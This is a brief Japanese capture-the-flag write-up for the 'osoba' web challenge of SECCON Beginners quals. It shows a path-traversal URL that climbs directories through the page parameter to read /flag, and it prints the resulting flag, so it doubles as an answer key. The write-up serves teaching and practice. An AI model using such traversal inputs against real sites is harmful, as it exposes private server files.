## osoba
### 解法
- 『フラグはサーバの /flag にあります！』とあるので、URLをいじって/flagにアクセスすることを考える
- リンク先を見ると以下の形式で各ファイルにアクセスできそうなので、適当な回数上位フォルダに上ってから目当ての /flag を指定してみるとflagが表示される
    - https://osoba.quals.beginners.seccon.jp/?page=public/***
 
### 例
https://osoba.quals.beginners.seccon.jp/?page=public/../../flag

### flag
ctf4b{omisoshiru_oishi_keredomo_tsukuruno_taihen}